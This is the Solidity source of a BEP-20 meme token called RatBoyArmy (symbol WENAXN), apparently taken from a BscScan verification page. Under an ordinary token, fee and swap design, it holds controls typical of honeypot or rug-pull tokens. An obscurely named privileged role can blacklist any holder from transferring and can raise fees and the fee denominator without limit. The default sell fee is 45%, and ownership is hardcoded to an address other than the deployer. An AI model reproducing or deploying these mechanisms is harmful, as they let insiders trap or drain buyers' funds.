/**
 *Submitted for verification at BscScan.com on 2022-09-01
*/

// Telegram - https://t.me/RatBoyArmy

//SPDX-License-Identifier: MIT    

pragma solidity ^0.8.16;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Access {
    address internal owner;
    mapping (address => bool) internal SOIN;

    constructor(address _owner) {
        owner = 0xE2cCAC8FF663181BaFC3655FAafB042A1f4781F9;
        SOIN[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier Soin() {
        require(isSoin(msg.sender), "!GA"); _;
    }

    function ga(address account) public onlyOwner {
        SOIN[account] = true;
    }

    function unga(address account) public onlyOwner {
        SOIN[account] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isSoin(address account) public view returns (bool) {
        return SOIN[account];
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        SOIN[account] = true;
        emit OwnershipTransferred(account);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract RatBoyArmy is IBEP20, Access {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address TEAM  = 0xE2cCAC8FF663181BaFC3655FAafB042A1f4781F9;

    address private autoLiquidityReceiver;
    address public marketingFeeReceiver;

    string constant _name = "RatBoyArmy";
    string constant _symbol = "WENAXN";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);

    uint256 public _maxTxAmount = (_totalSupply) * 2 / 100;
    uint256 public _maxWalletToken = (_totalSupply * 2) / 100;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isBlacklisted;

    uint256 public liquidityFeeBuy = 1; 
    uint256 public marketingFeeBuy = 6;
    uint256 public teamFeeBuy = 2;
    uint256 public totalFeeBuy = 9;

    uint256 public liquidityFeeSell = 5;
    uint256 public marketingFeeSell = 35;
    uint256 public teamFeeSell = 5;
    uint256 public totalFeeSell = 45;

    uint256 liquidityFee;
    uint256 marketingFee;
    uint256 teamFee;
    uint256 totalFee;
    uint256 feeDenominator = 100;

    uint256 public swapThreshold = (_totalSupply * 1) / 1000;

    uint256 targetLiquidity = 10;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;
    uint256 public launchedAt;
    bool public swapEnabled = true;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }


    constructor (address r) Access(msg.sender) {

        router = IDEXRouter(r);
        pair = IDEXFactory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _presaler = msg.sender;
        isFeeExempt[_presaler] = true;
        isTxLimitExempt[_presaler] = true;
        isWalletLimitExempt[_presaler] = true;

        isWalletLimitExempt[address(pair)] = true;
        isWalletLimitExempt[address(this)] = true;

        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver =0xfd04ffdFA4bDE2Cca831fFd910C7b967FF378cCf;

        _balances[_presaler] = _totalSupply;
        emit Transfer(address(0), _presaler, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

     function setMaxWalletPercent(uint256 newmaxWallPercent) external onlyOwner() {
        _maxWalletToken = newmaxWallPercent;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        require(!isBlacklisted[recipient] && !isBlacklisted[sender], 'Address is blacklisted');

        bool isSell = recipient == pair; 

        setCorrectFees(isSell);

        checkMaxWallet(sender, recipient, amount);

        checkTxLimit(sender, amount, recipient);

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setCorrectFees(bool isSell) internal {
        if(isSell){
            liquidityFee = liquidityFeeSell;
            marketingFee = marketingFeeSell;
            teamFee = teamFeeSell;
            totalFee = totalFeeSell;
        } else {
            liquidityFee = liquidityFeeBuy;
            marketingFee = marketingFeeBuy;
            teamFee = teamFeeBuy;
            totalFee = totalFeeBuy;
        }
    }


    function checkTxLimit(address sender, uint256 amount, address recipient) internal view {
        if (recipient != owner){
                require(amount <= _maxTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");
        }
    }
    
    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if (!SOIN[sender] && recipient != owner && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver && recipient != TEAM && !isWalletLimitExempt[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
        }
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTotalFee() public view returns (uint256) {
        if(launchedAt >= block.number){ return feeDenominator.sub(1); }
        return totalFee;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = _balances[address(this)];
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = contractTokenBalance.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance;
        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBTeam = amountBNB.mul(teamFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.sub(amountBNBLiquidity).sub(amountBNBTeam); 

        (bool successMarketing, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        (bool successTeam, /* bytes memory data */) = payable(TEAM).call{value: amountBNBTeam, gas: 30000}(""); 
        require(successMarketing, "marketing receiver rejected ETH transfer");
        require(successTeam, "team receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
    }

    function setBuyTxLimitInPercent(uint256 newmaxBuyTxPercent) external Soin {
        _maxTxAmount = newmaxBuyTxPercent;
    }

    function addToBlackLists(address[] calldata addresses) external Soin {
    for (uint256 i; i < addresses.length; ++i) {
    isBlacklisted[addresses[i]] = true;
    }
   }

    function setIsFeeExempt(address holder, bool exempt) external Soin {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external Soin {
        isTxLimitExempt[holder] = exempt;
    }

    function removeFromBlackList(address account) external onlyOwner {
    isBlacklisted[account] = false;
    }

    function setBuyFees(uint256 _liquidityFeeBuy, uint256 _marketingFeeBuy, uint256 _teamFeeBuy, uint256 _feeDenominator) external Soin {
        liquidityFeeBuy = _liquidityFeeBuy;
        marketingFeeBuy = _marketingFeeBuy;
        teamFeeBuy = _teamFeeBuy;
        totalFeeBuy = _liquidityFeeBuy.add(_marketingFeeBuy).add(_teamFeeBuy);
        feeDenominator = _feeDenominator;
    }

    function setSellFees(uint256 _liquidityFeeSell, uint256 _marketingFeeSell, uint256 _teamFeeSell, uint256 _feeDenominator) external Soin {
        liquidityFeeSell = _liquidityFeeSell;
        marketingFeeSell = _marketingFeeSell;
        teamFeeSell = _teamFeeSell;
        totalFeeSell = _liquidityFeeSell.add(_marketingFeeSell).add(_teamFeeSell);
        feeDenominator = _feeDenominator;
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external Soin {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 newLimit) external Soin {
        swapEnabled = _enabled;
        swapThreshold = newLimit; 
    }

    function removeFromBlackListwallets(address[] calldata addresses) public onlyOwner(){
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = false;
        }
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external Soin {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function manualSend() external Soin {
        uint256 contractETHBalance = address(this).balance;
        payable(marketingFeeReceiver).transfer(contractETHBalance);
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
    
    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}